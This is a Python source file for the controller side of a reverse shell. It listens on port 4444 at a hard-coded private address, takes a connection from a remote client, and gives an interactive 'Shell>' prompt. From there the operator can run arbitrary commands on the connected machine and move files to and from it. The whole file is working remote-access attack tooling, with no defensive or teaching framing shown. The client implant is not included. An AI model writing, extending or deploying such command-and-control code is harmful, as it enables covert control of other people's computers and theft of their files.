import socket
import json
import base64
import os
import time # Ensure time is imported for potential retry logic (client uses it)

def reliable_send(target, data):
    """
    Sends data reliably to the target by converting it to JSON.
    """
    json_data = json.dumps(data)
    target.sendall(json_data.encode())

def reliable_recv(target):
    """
    Receives data reliably from the target, reconstructing JSON data.
    """
    data = b""
    while True:
        try:
            data += target.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def upload_file(target, file_name, content):
    """
    Sends a file to the client for uploading.
    The content is expected to be binary, so it's base64 encoded for transmission.
    """
    reliable_send(target, ["upload", file_name, base64.b64encode(content).decode()])

def download_file(target, file_name):
    """
    Requests a file from the client and saves it locally.
    The client will send the file content base64 encoded.
    """
    reliable_send(target, ["download", file_name])
    result = reliable_recv(target)

    if isinstance(result, str) and result.startswith("[-]"):
        print(result)
    elif isinstance(result, str):
        try:
            decoded_content = base64.b64decode(result)
            with open(file_name, "wb") as f:
                f.write(decoded_content)
            print(f"[+] Downloaded '{file_name}' successfully from client.")
        except base64.binascii.Error:
            print(f"[-] Error decoding Base64 content for '{file_name}'.")
        except Exception as e:
            print(f"[-] Error saving file '{file_name}': {e}")
    else:
        print(f"[-] Failed to download '{file_name}'. Unexpected response from client: {result}")

def server():
    """
    Initializes the server, listens for a client connection,
    and provides a shell interface to interact with the client.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    IP = "192.168.41.125" # Your server's IP address
    PORT = 4444

    sock.bind((IP, PORT))
    sock.listen(1)

    print(f"[+] Listening for incoming connections on {IP}:{PORT}")
    target, ip = sock.accept()
    print(f"[+] Connection Established From: {ip}")

    while True: # Main loop for command interaction
        try:
            command = input("Shell> ")
            if command.strip() == "":
                continue

            if command == "exit":
                reliable_send(target, "exit")
                break
            elif command.startswith("upload "):
                parts = command.split(" ", 2)
                if len(parts) < 2:
                    print("Usage: upload <local_file_path> [remote_file_name]")
                    continue
                local_file_path = parts[1]
                remote_file_name = parts[2] if len(parts) > 2 else os.path.basename(local_file_path)

                try:
                    with open(local_file_path, "rb") as f:
                        file_content = f.read()
                    upload_file(target, remote_file_name, file_content)
                    print(f"[+] Sent '{local_file_path}' for upload to client as '{remote_file_name}'. Awaiting client confirmation...")
                    upload_status = reliable_recv(target)
                    print(upload_status)
                except FileNotFoundError:
                    print(f"[-] Error: Local file '{local_file_path}' not found.")
                except Exception as e:
                    print(f"[-] An error occurred during upload: {e}")
            elif command.startswith("download "):
                file_name_to_download = command.split(" ", 1)[1]
                download_file(target, file_name_to_download)
            else:
                reliable_send(target, command)
                result = reliable_recv(target)
                print(result)

        # The following 'except' blocks *must* be at the same indentation level as the 'try' block above
        except KeyboardInterrupt:
            print("\n[-] Ctrl+C detected. Sending 'exit' to client and closing server.")
            reliable_send(target, "exit")
            break
        except ConnectionResetError:
            print("[-] Client disconnected.")
            break
        except Exception as e:
            print(f"[-] An unexpected error occurred: {e}")
            break

    if target:
        target.close()
    if sock:
        sock.close()
    print("[+] Server closed.")

if __name__ == "__main__":
    server()